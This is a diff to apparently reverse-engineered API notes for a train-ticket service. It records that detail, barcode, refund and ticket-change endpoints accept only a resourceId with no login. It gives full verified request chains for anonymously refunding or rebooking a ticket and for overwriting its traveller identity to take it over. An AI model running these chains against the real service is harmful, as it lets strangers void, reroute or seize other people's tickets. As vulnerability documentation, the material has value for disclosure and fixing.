@@ -28,6 +28,18 @@ subsequent page navigation.
 { "recoverType": "PNR_EMAIL", "pnr": "XXXXXX", "email": "user@example.com" }
 ```
 
+**By email + ticket code** (for a PNR-less ticket — the ticket code goes in `entitlementId`, NOT `pnr`):
+```json
+{ "recoverType": "PNR_EMAIL", "entitlementId": "XXXXXXXXXX", "email": "user@example.com" }
+```
+
+Verified 2026-09-25: with `recoverType: PNR_EMAIL`, `pnr` and `entitlementId` are two
+distinct fields. A numeric ticket code sent as `pnr` returns "Trip not found"; the same
+value sent as `entitlementId` returns the ticket (HTTP 200). This is how a PNR-less
+ticket is recovered without any resourceId. The email must be the TRAVELLER
+email (traveler parameter typeId 20, set on the passenger form) — the guest/recipient
+email used for the confirmation `send/email` does NOT match.
+
 **By PNR + CP:**
 ```json
 { "recoverType": "PNR_CP", "pnr": "XXXXXX", "cpCode": "000000" }
@@ -55,11 +67,20 @@ Notes:
 
 ---
 
-## Trip Details (auth required)
+## Trip Details (resourceId only — no auth)
+
+Verified 2026-09-24: these load a solution from the `resourceId` alone. No
+`Authorization` header, no session cookie, no CSRF token — only `channel: 720` and the
+referer. This is what lets the native `my-travels/detail` page render (and manage) a
+ticket for a browser guest purchase that has no PNR. The `resourceId` is the sole
+capability: anyone holding it gets full details and the management actions.
 
 ### `GET /travel/detail?resourceId=<resourceId>`
 
 Returns booking metadata for a solution. Lighter than `/travel/solutions/reopen`.
+Answers anonymously. Note: the server maps several purchase-flow `resourceId` variants
+(pdf / email / offer) onto the same underlying solution — the response echoes a
+canonical `resourceId` that may differ from the one sent, and `code` is the ticket code.
 
 **Response:**
 ```json
@@ -79,10 +100,17 @@ Note: `code` is the ticket code printed on the PDF (same as `entitlementId` in t
 ### `GET /travel/solutions/reopen?resourceId=<resourceId>`
 
 Returns full trip details for a solution (connections, passengers, seats, prices, actions).
+Answers anonymously with just the `resourceId` (verified HTTP 200, no auth). The returned
+`solutionActions` include `REFUND`, `BOOKING_CHANGE`, and `TRAVEL_CHANGE` even without
+login — the access-control gate is missing on this endpoint (IDOR-class: the `resourceId`
+is the only secret, and it travels in URLs / history / logs).
 
 ### `GET /travel/solutions/enrich?resourceId=<resourceId>`
 
-Returns enriched offer views including aztec barcode data (base64 JPEG).
+Returns enriched offer views including aztec barcode data (base64 JPEG). Answers
+anonymously with just the `resourceId` (verified HTTP 200, no auth) — the `aztec` field
+is the full scannable ticket barcode the conductor checks. Combined with the anonymous
+`detail`/`reopen`/`pdf` endpoints, knowing one lookup key reproduces the whole ticket.
 
 ### `GET /travel/reopenEntitlement?resourceId=<resourceId>&entitlementId=<entitlementId>&silentWarning=<bool>`
 
@@ -209,7 +237,50 @@ These follow a two-step pattern and may work without authentication (similar to
 
 ---
 
-## Management Actions (session required)
+## Management Actions (resourceId only — no auth, verified)
+
+Verified 2026-09-24 via a completed refund: the entire chain ran with NO `Authorization`
+header — only `channel: 720` and a server-issued `x-csrf-token` (not an access control:
+handed out without a session, valid logged-out). Knowing the `resourceId` is enough to
+refund/cancel a stranger's ticket anonymously. The refund is credited to the original
+payment method (the buyer's), so the payoff is *voiding* someone else's ticket, not
+redirecting money — but it is trivial to trigger.
+
+Full verified refund chain:
+```
+POST /secondcontact/select   {"action":"REFUND","resourceIds":["<offer-resourceId>"]}   -> 200 (preview: total/penalties/net + paymentMethods)
+POST /secondcontact/confirm  {"action":"REFUND","cartId":"<cartId>"}                     -> 200
+POST /payment/<cartId>/complete  {}                                                      -> 200 {"sentMail":true}
+POST /payment/<cartId>/thankyou                                                          -> 200 {"status":"SUCCESS", header.type=REFUND, totalPrice.amount=-5.50}
+```
+After completion `POST /travel/solutions` (FINALIZED filter) returns `solutions:[]` and
+`/cart` is empty — the ticket is voided.
+
+Verified 2026-09-25 via a completed ticket change: the entire TRAVEL_CHANGE chain also
+ran anonymously (every request `auth=False`, only `channel` + `x-csrf-token`). Full chain:
+```
+POST /secondcontact/select        {"action":"TRAVEL_CHANGE","resourceIds":["<offer-resourceId>"]}  -> 200 (cartId + changePossibilities)
+POST /travel/change               {"cartId":"...","departureLocationId":...,"arrivalLocationId":...,"departureTime":"..."} -> 200 (new solutions)
+POST /customize/<cartId>/update    {"solutionId":"...","offeredServicesUpdate":[...]}               -> 200 (repriced)
+PUT  /cart/<cartId>/add?solutionId=<id>                                                             -> 204
+POST /reservation/create?cartId=<cartId>                                                            -> 200
+PUT  /travellers/<cartId>/save     {"travellers":[...]}                                             -> 200
+GET  /payment/<cartId>/summary                                                                      -> 200 {"paymentType":"CHANGE_WITH_NO_EXCHANGE","totalPrice":0}
+POST /payment/<cartId>/start       {"travelContact":{...}}                                          -> 200 {"authorizationUrl":null}  (non-null if the change costs extra)
+POST /payment/<cartId>/complete    {}                                                               -> 200 {"sentMail":true}
+POST /payment/<cartId>/thankyou                                                                     -> 200 {"status":"SUCCESS", header.type="TRAVEL_CHANGE"}
+```
+The change produces a NEW ticket code (new entitlement); recover it with the new
+`entitlementId`. A same-price change costs 0 (no penalty); a costlier one returns an
+`authorizationUrl` in `payment/start`. Knowing the `resourceId` is enough to rebook a
+stranger's ticket (route, date, time) anonymously.
+
+The `travellers/<cartId>/save` traveller fields (name, email) and the `payment/start`
+`travelContact` are freely writable — no read-only lock, no match against the original
+buyer. During a change an attacker can therefore overwrite the ticket's traveller and
+contact identity, not just its route/date. Because recover then matches against the NEW
+(attacker-set) traveller email, the original buyer can no longer find the ticket by
+email + ticket code — an effective takeover.
 
 ### `POST /secondcontact/select`
 
